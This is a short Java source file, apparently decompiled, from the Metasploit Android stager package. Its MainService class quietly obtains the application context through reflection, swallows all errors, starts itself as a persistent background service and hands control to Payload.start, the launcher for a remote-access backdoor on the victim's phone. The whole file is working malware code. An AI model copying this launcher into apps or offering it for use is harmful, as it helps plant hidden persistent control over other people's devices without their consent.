package com.metasploit.stage;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import java.lang.reflect.Method;

public class MainService extends Service {
    public static void start() {
        try {
            try {
                Method method = Class.forName("android.app.ActivityThread").getMethod("currentApplication", new Class[0]);
                Context context = (Context) method.invoke(null, null);
                if (context == null) {
                    new Handler(Looper.getMainLooper()).post(new c(method));
                } else {
                    startService(context);
                }
            } catch (Exception e) {
            }
        } catch (ClassNotFoundException e2) {
        }
    }

    public static void startService(Context context) {
        context.startService(new Intent(context, MainService.class));
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        Payload.start(this);
        return 1;
    }
}
